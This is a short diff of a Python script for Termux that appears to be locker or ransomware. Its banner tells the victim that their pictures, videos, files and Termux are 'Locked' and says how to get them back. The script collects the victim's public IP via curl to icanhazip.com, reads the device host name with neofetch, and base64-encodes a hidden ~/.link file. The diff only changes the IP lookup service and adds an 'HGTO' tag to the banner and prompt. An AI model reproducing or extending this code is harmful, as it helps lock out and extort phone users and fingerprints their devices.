@@ -11,12 +11,13 @@ prple="\033[1;35m"
 cyan="\033[1;36m"
 res="\033[0m"
 ps=''
-IP=subprocess.run("curl ifconfig.me", capture_output=True,shell=True).stdout.decode('ascii')
+IP=subprocess.run("curl icanhazip.com", capture_output=True,shell=True).stdout.decode('ascii')
 dev=subprocess.run("neofetch |grep Host|cut -d ':' -f 2-10 ", capture_output=True,shell=True).stdout.decode('ascii')
 code=subprocess.run("cat ~/.link |base64", capture_output=True,shell=True).stdout.decode('ascii')
 
 def logo():
   print(f"""
+  HGTO
   {grn}      Your Picture ,Videos or files 
         and termux is {red}Locked🔒
 	{grn}If you want to get it back
@@ -43,7 +44,7 @@ os.system("clear")
 logo()
 while 1:
 	try:
-		test=input(f"{grn}choice {blue}> {yel}")
+		test=input(f"{grn}HGTO {blue}> {yel}")
 	except EOFError:
 		pass
 	
